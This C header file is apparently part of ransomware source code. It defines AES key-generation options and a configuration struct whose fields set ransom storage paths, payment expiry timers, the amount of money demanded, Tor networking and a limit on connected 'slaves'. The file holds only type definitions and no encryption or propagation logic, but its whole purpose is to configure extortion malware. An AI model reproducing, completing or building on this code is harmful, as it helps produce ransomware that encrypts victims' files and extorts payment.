#ifndef CONFIG_INCLUDED
#define CONFIG_INCLUDED

typedef enum _AES_KEY_GEN_TYPE {
    AES_KEY_GEN_XOROSHIRO          = 0,
    AES_KEY_GEN_HARDWARE           = 1,
    AES_KEY_GEN_HARDWARE_XOROSHIRO = 2, // If hardware doesn't support rdrand, use XOROSHIRO
    AES_KEY_GEN_HARDWARE_BCRYPT    = 3, // If hardware doesn't support rdrand, use CRYPTOAPI
    AES_KEY_GEN_BCRYPT             = 4
} AES_KEY_GEN_TYPE, *PAES_KEY_GEN_TYPE;

typedef struct _CONFIG {
    struct {
        AES_KEY_GEN_TYPE KeyGenAlgorithm;
        PVOID Key;
        PVOID KeyIv;
    } Aes;

    struct {
        PWSTR szStoragePath;               // RansomStorageFolder
        ULONG dwExpireTime;                // RansomExpiresAfter in minutes
        ULONG dwMoneyWanted;               // RansomMoneyWanted
        ULONG dwCheckExpirationsDateAfter; // RansomCheckExpirationsDateAfter in minutes
    } Ransom;

    struct {
        BOOL  bUseTor;                     // NetUseTor
        ULONG dwPort;                      // NetPort
        ULONG dwThreads;                   // NetThreads
        ULONG dwMaxConnectionActive;       // NetMaxSlavesAtOnce
    } Network;

    struct {
        BOOL  bEnabled;                    // EnableLog
        PWSTR szLogPath;                   // LoggerPathDirector
        ULONG dwMaxLogSize;                // MaxSizePerLog
    } Log;
} CONFIG, *PCONFIG;

extern CONFIG Config;

BOOL
InitConfig(VOID);

#endif
